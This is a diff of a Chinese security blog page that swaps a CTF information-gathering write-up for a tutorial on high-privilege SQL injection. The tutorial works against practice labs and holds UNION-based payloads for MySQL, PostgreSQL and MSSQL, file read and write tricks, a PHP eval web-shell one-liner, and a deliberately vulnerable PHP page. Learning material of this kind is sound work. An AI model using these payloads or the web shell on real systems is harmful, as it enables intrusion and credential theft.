@@ -4,15 +4,14 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="CTFSHOW-web入门-信息收集">
-    <meta name="description" content="web1
-直接F2查看源代码，或者ctrl+u查看源码，flag就在注释里面。
-web2
-这一关它限制了鼠标右键和键盘F12，但ctrl+u便可看到源代码，flag就在注释里面。
-web3
-打开，一看
+    <meta name="keywords" content="SQL注入漏洞分析">
+    <meta name="description" content="前言：
 
-通过查看源代码，并没有看出有什么特殊">
+上一篇文章分析SQL注入漏洞，针对数据库类型以及高权限注入没有完全分析完，这一篇文章接着分析。
+
+不通数据库类型权限操作区分：
+Access 无高权限注入点-只能猜解，而且暴力猜解，也可以根据它数据库的特性猜解
+MYSQL，Pos">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -24,7 +23,7 @@ web3
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>CTFSHOW-web入门-信息收集 | 阿浩の博客</title>
+    <title>SQL注入漏洞分析(二) | 阿浩の博客</title>
     <link rel="icon" type="image/png" href="/favicon.png">
     
     <style>
@@ -418,7 +417,7 @@ web3
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">CTFSHOW-web入门-信息收集</h1>
+                    <h1 class="description center-align post-title">SQL注入漏洞分析(二)</h1>
                 </div>
             </div>
         </div>
@@ -442,16 +441,12 @@ web3
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/CTFSHOW/">
-                                <span class="chip bg-color">CTFSHOW</span>
+                            <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">
+                                <span class="chip bg-color">渗透测试</span>
                             </a>
                         
-                            <a href="/tags/CTF/">
-                                <span class="chip bg-color">CTF</span>
-                            </a>
-                        
-                            <a href="/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">
-                                <span class="chip bg-color">信息收集</span>
+                            <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">
+                                <span class="chip bg-color">漏洞分析</span>
                             </a>
                         
                     </div>
@@ -462,8 +457,8 @@ web3
                     <div class="post-cate">
                         <i class="fas fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/CTF/" class="post-category">
-                                CTF
+                            <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" class="post-category">
+                                渗透测试
                             </a>
                         
                     </div>
@@ -475,21 +470,21 @@ web3
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2023-05-26
+                    2023-06-01
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2023-05-28
+                    2023-06-01
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    1.3k
+                    1.4k
                 </div>
                 
 
@@ -514,96 +509,150 @@ web3
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="web1">web1</h2>
-<p>直接F2查看源代码，或者ctrl+u查看源码，flag就在注释里面。</p>
-<h2 id="web2">web2</h2>
-<p>这一关它限制了鼠标右键和键盘F12，但ctrl+u便可看到源代码，flag就在注释里面。</p>
-<h2 id="web3">web3</h2>
-<p>打开，一看</p>
-<p><img src="/medias/loading.gif" data-original="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202305262031101.png" alt=""></p>
-<p>通过查看源代码，并没有看出有什么特殊的信息</p>
-<p>使用burpsuite抓包后，发现响应包里面有flag</p>
-<p><img src="/medias/loading.gif" data-original="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202305262031667.png" alt=""></p>
-<p>其实用浏览器抓包也行，也一样可以在找到flag</p>
-<p><img src="/medias/loading.gif" data-original="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202305262031394.png" alt=""></p>
-<h2 id="web4">web4</h2>
-<p>根据题目提示，在robots.txt可能会重要信息，查看：</p>
-<p><img src="/medias/loading.gif" data-original="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202305262031376.png" alt=""></p>
-<p>根据提示，访问==/flagishere.txt==，flag出来了</p>
-<p><img src="/medias/loading.gif" data-original="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202305262031472.png" alt=""></p>
-<h2 id="web5">web5</h2>
-<p>根据题目提示，可能与phps源码泄露有关系</p>
-<p>访问<mark>index.phps</mark>文件</p>
-<p><img src="/medias/loading.gif" data-original="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202305262032553.png" alt=""></p>
-<p>可以直接下载<mark>index.phps</mark>文件，查看文件内容，便可以看到flag</p>
-<p><img src="/medias/loading.gif" data-original="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202305262032441.png" alt=""></p>
-<h2 id="web6">web6</h2>
-<p>根据题目提示，应该在源码中有重要信息，通过目录扫描工具，可以扫出它有<mark>www.rar</mark>敏感文件，直接访问这个<mark>www.rar</mark>，便可以把源码下载下来，查看</p>
-<p><img src="/medias/loading.gif" data-original="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202305262032042.png" alt=""></p>
-<p>直接访问<mark>fl00g.txt</mark>，便可以得到flag</p>
-<p><img src="/medias/loading.gif" data-original="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202305262032832.png" alt=""></p>
-<h2 id="web7">web7</h2>
-<p>根据题目提示，<mark>版本控制很重要，但不要部署到生产环境更重要</mark>。这个可能是有些人在开发项目的时候会将自己的项目同步上传到GitHub这样的平台，会有==.git<mark>目录遗留，如果这种情况，他在部署环境如果不细心，把</mark>.gti==目录删除，就会遗留在已部署的环境中。</p>
-<p>通过dirsearch扫描，能扫描到==.git==目录，直接访问，便可得到flag</p>
-<p><img src="/medias/loading.gif" data-original="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202305262032242.png" alt=""></p>
-<h2 id="web8">web8</h2>
-<p>这一关和上一个关，只不过这一个遗留目录是==.svn==</p>
-<p>通过dirsearch扫描出来，直接访问，便可得到flag</p>
-<h2 id="web9">web9</h2>
-<p>这一关属于vim缓存信息泄露。</p>
-<p>当开发人员在线上环境中使用 vim 编辑器，在使用过程中会留下 vim 编辑器缓存，当vim异常退出时，缓存会一直留在服务器上，引起网站源码泄露。</p>
-<p>直接访问==/index.php.swp==，便可以下载<mark>index.php.svp</mark>文件，打开，查看，便可以得到flag</p>
-<p><img src="/medias/loading.gif" data-original="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202305262032705.png" alt=""></p>
-<h2 id="web10">web10</h2>
-<p>cookie里面应该有重要信息，直接抓包，便可以得到flag，比较简单</p>
-<p><img src="/medias/loading.gif" data-original="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202305262032553.png" alt=""></p>
-<h2 id="web11">web11</h2>
-<p>这一关考的是域名解析</p>
-<p>直接使用解析命令<code> nslookup -qt=txt flag.ctfshow.com</code></p>
-<p><img src="/medias/loading.gif" data-original="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202305262033471.png" alt=""></p>
+                <p><strong>前言：</strong></p>
 <blockquote>
-<p>查询全部域名解析记录 基本格式：nslookup -query=any host [server]</p>
+<p>上一篇文章分析SQL注入漏洞，针对数据库类型以及高权限注入没有完全分析完，这一篇文章接着分析。</p>
 </blockquote>
-<h2 id="web12">web12</h2>
-<p>查看一下robots.txt文件，发现==/admin==，直接访问，需要用户名和密码，用户名应该是admin，根据题目提示，密码可能出现在页面中，再仔细看一下页面，密码应该是底下那个提示</p>
-<p><img src="/medias/loading.gif" data-original="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202305262033738.png" alt=""></p>
-<p>果真登录用户名admin以及密码372619038，便可获得flag</p>
-<h2 id="web13">web13</h2>
-<p>在页面下面发现document，查看后，下面发现后台地址以及用户名和密码</p>
-<p><img src="/medias/loading.gif" data-original="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202305262033216.png" alt=""></p>
-<p>打开后台地址，输入用户名和密码，就可以获取flag了</p>
-<h2 id="web14">web14</h2>
-<p>直接用<mark>dirsearch</mark>扫描敏感目录，发现==/editor==，访问，发现编辑器，点击上传文件按钮，看一下，发现里面可以看到空间文件，这个空间文件是属于服务器中的文件，在var/www/html中的nothingthere发现有一个文件fl000g.txt，访问==/nothinghere/fl000g.txt==便可以获取flag</p>
-<p><img src="/medias/loading.gif" data-original="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202305262033017.png" alt=""></p>
-<h2 id="web15">web15</h2>
-<p>用dirsearch扫描到==/admin<mark>这个目录，直接访问，发现是一个后台登录系统，先试一下点击忘记密码，发现密保是填写城市，再首页中的qq邮箱，查到管理员属于西安，输入密保城市</mark>西安后便可以获取管理员密码，登录后台用户名admin，密码admin7789，便可以获取flag</p>
-<h2 id="web16">web16</h2>
+<p><strong>不通数据库类型权限操作区分：</strong></p>
+<pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">Access 无高权限注入点-只能猜解，而且暴力猜解，也可以根据它数据库的特性猜解
+MYSQL，PostgreSQL，MSSQL 高权限注入点-可升级读写执行等<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<h2 id="MySQL-root高权限读写注入">MySQL-root高权限读写注入</h2>
+<p><strong>读取文件：</strong></p>
+<ul class="lvl-0">
+<li class="lvl-2">
+<p>==load_file()==是读取文件函数</p>
+</li>
+</ul>
+<p>读取本地文件示例：</p>
+<p><code>select load_file('c:/1.txt');</code></p>
+<p>从注入点测试示例，测试代码：</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php
+//声明文件解析的编码格式
+header('Content-type:text/html;charset=utf-8');
+//操作数据库讲数据取出进行展示
+$conn=mysql_connect('localhost','root','root');
+mysql_select_db('beescms',$conn);
+
+$i=$_GET['id'];//GET请求接受id参数名值给变量i
+$sql="select * from bees_article where id='$i'";
+$result=mysql_query($sql,$conn); //执行sql语句
+
+while($row=mysql_fetch_array($result)){
+    echo '&lt;br&gt;&lt;br&gt;&lt;hr&gt;';
+    echo $row['id'];
+    echo $row['content'];
+}
+?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>测试结果：</p>
+<p><img src="/medias/loading.gif" data-original="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202306012253958.png" alt=""></p>
+<p>说明在高权限条件下可以读取文件</p>
+<p><strong>写入文件：</strong></p>
+<ul class="lvl-0">
+<li class="lvl-2">
+<p>into outfile</p>
+</li>
+<li class="lvl-2">
+<p>into dumpfile</p>
+</li>
+</ul>
+<p>本地写入命令：</p>
+<p><code>select 'xxx' into outfile 'c:/test.txt';</code></p>
+<p>从测试点注入测试：</p>
+<p><img src="/medias/loading.gif" data-original="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202306012253433.png" alt=""></p>
+<p>虽然好像有个报错，我也不太清楚那是怎么回事（可能是代码的处理问题），但是可以看得在高权限条件下是可以进行文件写入，只要把要写入的内容换成后门代码便可以实现后面getshell的进一步操作</p>
 <blockquote>
-<p>PHP探针php探针是用来探测空间、服务器运行状况和PHP信息用的，探针可以实时查看服务器硬盘资源、内存占用、网卡 流量、系统负载、服务器时间等信息。</p>
+<p>简单后门代码：<br>
+<code>&lt;?php eval($_POST[x]);?&gt;</code></p>
 </blockquote>
-<p>访问==/tz.php==，然后再查看phpinfo，接着直接搜索ctf，便可以看到flag</p>
-<h2 id="web17">web17</h2>
-<p>使用dirsearch扫描出有==/backup.sql==这个敏感目录，直接访问便可以下载，下载后查看，搜索ctf，便可以看到flag</p>
-<h2 id="web18">web18</h2>
-<p>这一关很有意思，这是一个javascript 的游戏，从js代码中可知，当score&gt;120时，且game_over这个参数为false时，即可赢</p>
-<p>打开浏览器的控制台</p>
-<p>依次执行<code>score=130 game_over=false  run()</code>后</p>
-<p><img src="/medias/loading.gif" data-original="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202305262033849.png" alt=""></p>
-<p>根据访问<mark>110.php</mark>，后便可以得到flag，为什么要访问110.php，你念一下那句话就知道了</p>
-<h2 id="web19">web19</h2>
-<p>通过查看前端源代码，这道题关键信息在</p>
-<p><img src="/medias/loading.gif" data-original="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202305262033397.png" alt=""></p>
-<p>拿去解密，可得</p>
-<p><img src="/medias/loading.gif" data-original="https://ahao8.oss-cn-guangzhou.aliyuncs.com/img/202305262034939.png" alt=""></p>
-<p>输入用户名admin，密码i_want_a_36d_girl，便可以获取flag</p>
-<h2 id="web20">web20</h2>
+<p>有了文件读取，那么接下来考虑一个问题，就是黑盒测试，怎么判断路径</p>
+<p><strong>路径的获取：</strong></p>
+<ul class="lvl-0">
+<li class="lvl-2">
+<p>phpinfo.php</p>
+<p>针对phpinfo.php文件，从开发者的角度，有可能是开发网站时测试遗留的；从安全测试人员的角度，可以通过利用写入文件权限写入，也可以通过利用网站的上传漏洞上传phpinfo文件（前提是网站有文件上传漏洞）</p>
+</li>
+<li class="lvl-2">
+<p>报错</p>
+<p>这可以测试尝试，得网站代码如何，有代码容错处理那种会报错一个异常错误，可能包含路径</p>
+</li>
+<li class="lvl-2">
+<p>字典</p>
+</li>
+</ul>
+<p><strong>写入文件阻碍：</strong></p>
+<p>无法写入：secure_file_priv 突破 注入中需要支持 SQL 执行环境，没有就需要借助 phpmyadmin 或能够直接连上对方数据库进行绕过</p>
+<pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">secure_file_priv 限制文件的读写，限制操作路径，比如`secure_file_priv=c:/`<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><strong>解决方法：</strong></p>
+<pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">set global slow_query_log=1; //开启慢日志
+set global slow_query_log_file='shell 路径';
+select '&lt;?php eval($_GET[A])?&gt;' or SLEEP(1);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<h2 id="PostgreSQL-高权限读写注入">PostgreSQL-高权限读写注入</h2>
+<p>这里用墨者的一个靶场演示，靶场链接：<a target="_blank" rel="noopener" href="https://www.mozhe.cn/bug/detail/86">https://www.mozhe.cn/bug/detail/86</a></p>
+<pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">测试字段:
+order by 4 #不报错
+order by 5 #报错
+and 1=2 union select null,null,null,null<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 <blockquote>
-<p>mdb文件是早期asp+access构架的数据库文件</p>
+<p>注：这个和mysql注入有区别</p>
 </blockquote>
-<p>访问==/db/db.mdb==，便可以下载mdb文件，然后使用EasyAccess.exe打开搜索ctf，便可以获取flag，也可以用notepad++打开搜索ctf也可以获取flag</p>
+<pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">测显位:
+and 1=2 union select 'null',null,null,null 错误
+and 1=2 union select null,'null',null,null 正常
+and 1=2 union select null,null,'null',null 正常
+and 1=2 union select null,null,null,'null' 错误
+#得出显位是第 2，3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">获取信息：
+and 1=2 UNION SELECT null,version(),null,null #获取数据库版本信息 PostgreSQL 9.5.13
+and 1=2 UNION SELECT null,current_user,null,null #获取当前用户 postgres
+and 1=2 union select null,current_database(),null,null #获取当前数据库 mozhedvcms<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">获取数据库名：
+and 1=2 union select null,string_agg(datname,','),null,null from 
+pg_database #s所有数据库名：template1,template0,postgres,mozhedvcms<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <blockquote>
-<p>免责声明：本文章涉及的知识和技能仅用于学习研究，如有用于非法途径或未被授权的真实网络环境，所造成的后果及连带责任自行承担，责任与本文作者无关，倡导把安全知识和技能用于正当、正规、正义的途径。</p>
+<p>string_agg获取所有，相当于mysql的group_concat()函数</p>
 </blockquote>
+<pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">获取表名：
+and 1=2 union select null,string_agg(tablename,','),null,null 
+from pg_tables where schemaname='public' #表名：notice,reg_users
+and 1=2 union select null,string_agg(relname,','),null,null 
+from pg_stat_user_tables #表名：reg_users,notice<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">获取列名：
+and 1=2 union select null,string_agg(column_name,','),null,null 
+from information_schema.columns where table_name='reg_users' #得到列名：id,name,password,status<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">获取数据：
+and 1=2 union select null,string_agg(name,','),string_agg(password,','),null from reg_users<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p>最后得到的密码进行md5解密，后登录，注意这里有个小坑，用户名是mozhe1，不是mozhe</p>
+<pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">补充-获取dba用户（同样在DBA用户下，是可以进行文件读写的）：
+and 1=2 union select null,string_agg(usename,','),null,null FROM pg_user WHERE usesuper IS TRUE
+如列出当前目录：
+and 1=2 union select null,pg_ls_dir('./'),null,null<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<p><strong>postgresql</strong>注入参考：<a target="_blank" rel="noopener" href="https://www.freebuf.com/sectool/249371.html">https://www.freebuf.com/sectool/249371.html</a></p>
+<h2 id="MSSQL-sa-高权限读写执行注入">MSSQL-sa 高权限读写执行注入</h2>
+<p>这里用墨者的一个靶场来演示，靶场链接：<a target="_blank" rel="noopener" href="https://www.mozhe.cn/bug/detail/90">https://www.mozhe.cn/bug/detail/90</a></p>
+<pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">测列数：
+order by 4 #不报错
+order by 5 #报错，说明字段为4<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">测显位：
+and 1=2 union all select 'null',null,null,null #无显位
+and 1=2 union all select null,'null',null,null #有显位
+and 1=2 union all select null,null,‘null’,null #有显位
+and 1=2 union all select null,null,null,‘null’ #没显位<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">获取信息：
+and 1=2 union all select null,@@version,null,null #获取版本信息
+db_name() 当前数据库名字
+user、system_user,current_user,user_name 获取当前用户名
+and 1=2 union all select null,@@SERVERNAME,null,null 获取服务器主机信息
+and 1=2 union all select null,db_name(),null,null #获取数据库<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">获取表名：
+and 1=2  union all select null,(select top 1 name from mozhe_db_v2.dbo.sysobjects where xtype='u'),null,null
+union all select null,(select top 1 name from mozhe_db_v2.dbo.sysobjects where xtype='u' and name not in ('manage')),null,null<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">获取列名：
+and 1=2  union all select null,(select top 1 col_name(object_id('manage'),1) from sysobjects),null,null
+and 1=2  union all select null,(select top 1 col_name(object_id('manage'),2) from sysobjects),null,null
+and 1=2  union all select null,(select top 1 col_name(object_id('manage'),3) from sysobjects),null,null
+and 1=2  union all select null,(select top 1 col_name(object_id('manage'),4) from sysobjects),null,null<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">获取数据：
+and 1=2 union all select null,username, password ,null from manage<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
                 
             </div>
@@ -630,7 +679,7 @@ web3
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://www.ahao8.top/posts/fd5.html">https://www.ahao8.top/posts/fd5.html</a>
+                    <a href="https://www.ahao8.top/posts/9afe.html">https://www.ahao8.top/posts/9afe.html</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -668,16 +717,12 @@ web3
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/CTFSHOW/">
-                                    <span class="chip bg-color">CTFSHOW</span>
+                                <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">
+                                    <span class="chip bg-color">渗透测试</span>
                                 </a>
                             
-                                <a href="/tags/CTF/">
-                                    <span class="chip bg-color">CTF</span>
-                                </a>
-                            
-                                <a href="/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">
-                                    <span class="chip bg-color">信息收集</span>
+                                <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">
+                                    <span class="chip bg-color">漏洞分析</span>
                                 </a>
                             
                         </div>
@@ -1003,16 +1048,17 @@ web3
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/posts/4921.html">
+                <a href="/posts/9afe.html">
                     <div class="card-image">
                         
-                        <img src="/medias/loading.gif" data-original="/medias/featureimages/29.jpg" class="responsive-img" alt="CTFSHOW-web入门-爆破">
+                        <img src="/medias/loading.gif" data-original="/medias/featureimages/28.jpg" class="responsive-img" alt="SQL注入漏洞分析(二)">
                         
-                        <span class="card-title">CTFSHOW-web入门-爆破</span>
+                        <span class="card-title">SQL注入漏洞分析(二)</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -1022,34 +1068,31 @@ web3
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2023-05-27
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2023-06-01
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/CTF/" class="post-category">
-                                    CTF
+                            <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" class="post-category">
+                                    渗透测试
                                 </a>
                             
                             
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/CTFSHOW/">
-                        <span class="chip bg-color">CTFSHOW</span>
+                    <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">
+                        <span class="chip bg-color">渗透测试</span>
                     </a>
                     
-                    <a href="/tags/CTF/">
-                        <span class="chip bg-color">CTF</span>
-                    </a>
-                    
-                    <a href="/tags/%E7%88%86%E7%A0%B4/">
-                        <span class="chip bg-color">爆破</span>
+                    <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">
+                        <span class="chip bg-color">漏洞分析</span>
                     </a>
                     
                 </div>
@@ -1063,12 +1106,12 @@ web3
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/posts/970c.html">
+                <a href="/posts/5a5a.html">
                     <div class="card-image">
                         
-                        <img src="/medias/loading.gif" data-original="/medias/featureimages/27.jpg" class="responsive-img" alt="信息收集">
+                        <img src="/medias/loading.gif" data-original="/medias/featureimages/31.jpg" class="responsive-img" alt="SQL注入漏洞分析(一)">
                         
-                        <span class="card-title">信息收集</span>
+                        <span class="card-title">SQL注入漏洞分析(一)</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -1079,7 +1122,7 @@ web3
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2023-05-26
+                                <i class="far fa-clock fa-fw icon-date"></i>2023-06-01
                             </span>
                         <span class="publish-author">
                             
@@ -1100,8 +1143,8 @@ web3
                         <span class="chip bg-color">渗透测试</span>
                     </a>
                     
-                    <a href="/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">
-                        <span class="chip bg-color">信息收集</span>
+                    <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">
+                        <span class="chip bg-color">漏洞分析</span>
                     </a>
                     
                 </div>
